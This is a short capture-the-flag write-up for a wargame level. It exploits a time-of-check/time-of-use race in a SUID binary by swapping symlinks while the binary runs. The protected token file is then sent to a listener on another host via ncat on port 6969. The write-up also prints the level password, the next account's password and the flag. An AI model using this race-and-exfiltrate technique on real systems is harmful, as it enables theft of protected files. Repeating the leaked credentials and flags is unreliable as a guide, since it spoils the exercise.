username: level10
password: s5cAJpM8ev6XHw998pRWG728z
---

`./level10` takes two arguments `file` and `host`, it checks if the user  running it can read `file` using access(), then sends its content to `host` if listenning on port 6969, `access()` function doesn't care about SUID bit

Started a listener on port 6969 on our main machine

```
ncat -klnp 6969
```

Then on SSH we ran the following commands

```
touch /tmp/a
while :; do ln -fs /tmp/a /tmp/b ; ln -fs /home/user/level10/token /tmp/b; done &
./level10 /tmp/b 10.14.1.1
```

You might need to run the last comman multiple times before receiving the token on the listener

flag10's password: woupa2yuojeeaaed06riuj63c

To get the flag run the following

```
su flag10 -c getflag
```

The flag is: feulo4b72j7edeahuete3no7c
